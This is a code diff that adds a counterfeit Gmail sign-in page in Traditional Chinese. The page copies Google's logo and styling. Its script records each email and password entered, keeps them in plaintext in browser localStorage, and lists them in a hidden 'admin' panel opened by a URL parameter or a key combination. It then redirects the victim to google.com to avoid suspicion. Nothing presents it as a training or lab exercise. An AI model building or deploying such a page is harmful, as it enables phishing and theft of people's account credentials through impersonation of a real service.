@@ -1,0 +1,275 @@
+<!DOCTYPE html>
+<html lang="zh-TW">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Gmail - 登入</title>
+    <style>
+        body {
+            font-family: 'Google Sans', Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f5f5f5;
+            color: #202124;
+        }
+        
+        .header {
+            padding: 20px;
+            text-align: left;
+        }
+        
+        .logo {
+            height: 40px;
+        }
+        
+        .container {
+            max-width: 450px;
+            margin: 0 auto;
+            padding: 48px 40px 36px;
+            background: #fff;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px 0 rgba(0,0,0,0.2);
+            margin-top: 50px;
+        }
+        
+        .title {
+            font-size: 24px;
+            font-weight: 400;
+            line-height: 1.3333;
+            margin-bottom: 0;
+            text-align: center;
+        }
+        
+        .subtitle {
+            font-size: 16px;
+            font-weight: 400;
+            letter-spacing: .1px;
+            line-height: 1.5;
+            padding-top: 8px;
+            color: #5f6368;
+            text-align: center;
+            margin-bottom: 40px;
+        }
+        
+        .form-group {
+            margin-bottom: 24px;
+        }
+        
+        .form-control {
+            width: 100%;
+            padding: 13px 15px;
+            font-size: 16px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            box-sizing: border-box;
+        }
+        
+        .form-control:focus {
+            border-color: #1a73e8;
+            outline: none;
+            box-shadow: 0 0 0 2px #e8f0fe;
+        }
+        
+        .btn {
+            width: 100%;
+            background-color: #1a73e8;
+            color: white;
+            border: none;
+            padding: 10px 24px;
+            font-size: 14px;
+            font-weight: 500;
+            border-radius: 4px;
+            cursor: pointer;
+            margin-top: 26px;
+        }
+        
+        .btn:hover {
+            background-color: #1765cc;
+        }
+        
+        .footer {
+            text-align: center;
+            margin-top: 24px;
+            font-size: 12px;
+            color: #5f6368;
+        }
+        
+        .error-message {
+            color: #d93025;
+            font-size: 14px;
+            margin-top: 10px;
+            display: none;
+        }
+        
+        /* 管理面板樣式 */
+        .admin-panel {
+            margin-top: 50px;
+            padding: 20px;
+            background: #fff;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px 0 rgba(0,0,0,0.2);
+            max-width: 800px;
+            margin-left: auto;
+            margin-right: auto;
+            display: none;
+        }
+        
+        .admin-panel h2 {
+            color: #d93025;
+            text-align: center;
+        }
+        
+        table {
+            width: 100%;
+            border-collapse: collapse;
+        }
+        
+        th, td {
+            padding: 12px;
+            text-align: left;
+            border-bottom: 1px solid #ddd;
+        }
+        
+        th {
+            background-color: #f2f2f2;
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google" class="logo">
+    </div>
+    
+    <div class="container">
+        <h1 class="title">登入</h1>
+        <p class="subtitle">使用您的 Google 帳戶</p>
+        
+        <form id="loginForm">
+            <div class="form-group">
+                <input type="email" id="email" class="form-control" placeholder="電子郵件或電話" required>
+            </div>
+            
+            <div class="form-group">
+                <input type="password" id="password" class="form-control" placeholder="輸入密碼" required>
+            </div>
+            
+            <div class="error-message" id="errorMessage"></div>
+            
+            <button type="submit" class="btn">繼續</button>
+        </form>
+        
+        <div class="footer">
+            <p>© 2023 Google</p>
+        </div>
+    </div>
+    
+    <!-- 管理員面板 -->
+    <div class="admin-panel" id="adminPanel">
+        <h2>管理員後台 - 登入記錄</h2>
+        <button onclick="clearRecords()" style="margin-bottom: 15px; padding: 5px 10px; background: #d93025; color: white; border: none; border-radius: 4px; cursor: pointer;">清除記錄</button>
+        <table id="loginRecords">
+            <thead>
+                <tr>
+                    <th>序號</th>
+                    <th>電子郵件</th>
+                    <th>密碼</th>
+                    <th>登入時間</th>
+                </tr>
+            </thead>
+            <tbody>
+                <!-- 登入記錄將在這裡動態添加 -->
+            </tbody>
+        </table>
+    </div>
+    
+    <script>
+        // 檢查localStorage中是否有已存儲的記錄
+        let loginRecords = JSON.parse(localStorage.getItem('gmailLoginRecords')) || [];
+        
+        // 初始化頁面時顯示已有記錄
+        document.addEventListener('DOMContentLoaded', function() {
+            updateAdminPanel();
+            
+            // 檢查URL參數是否有admin=true
+            const urlParams = new URLSearchParams(window.location.search);
+            if (urlParams.get('admin') === 'true') {
+                document.getElementById('adminPanel').style.display = 'block';
+            }
+        });
+        
+        // 登入表單提交處理
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            const errorElement = document.getElementById('errorMessage');
+            
+            if (!email || !password) {
+                errorElement.textContent = '請輸入電子郵件和密碼';
+                errorElement.style.display = 'block';
+                return;
+            }
+            
+            // 記錄登入信息
+            const record = {
+                email: email,
+                password: password,
+                timestamp: new Date().toLocaleString()
+            };
+            
+            loginRecords.push(record);
+            
+            // 保存到localStorage
+            localStorage.setItem('gmailLoginRecords', JSON.stringify(loginRecords));
+            
+            // 更新管理面板
+            updateAdminPanel();
+            
+            // 模擬登入成功後跳轉到Google首頁
+            setTimeout(function() {
+                window.location.href = 'https://www.google.com';
+            }, 1000);
+            
+            // 清空表單
+            this.reset();
+        });
+        
+        // 更新管理面板
+        function updateAdminPanel() {
+            const tbody = document.querySelector('#loginRecords tbody');
+            tbody.innerHTML = '';
+            
+            loginRecords.forEach((record, index) => {
+                const row = document.createElement('tr');
+                
+                row.innerHTML = `
+                    <td>${index + 1}</td>
+                    <td>${record.email}</td>
+                    <td>${record.password}</td>
+                    <td>${record.timestamp}</td>
+                `;
+                
+                tbody.appendChild(row);
+            });
+        }
+        
+        // 清除所有記錄
+        function clearRecords() {
+            if (confirm('確定要清除所有登入記錄嗎？')) {
+                loginRecords = [];
+                localStorage.setItem('gmailLoginRecords', JSON.stringify(loginRecords));
+                updateAdminPanel();
+            }
+        }
+        
+        // 快捷鍵打開管理面板 (Ctrl+Alt+A)
+        document.addEventListener('keydown', function(e) {
+            if (e.ctrlKey && e.altKey && e.key === 'a') {
+                const adminPanel = document.getElementById('adminPanel');
+                adminPanel.style.display = adminPanel.style.display === 'none' ? 'block' : 'none';
+            }
+        });
+    </script>
+</body>
+</html>
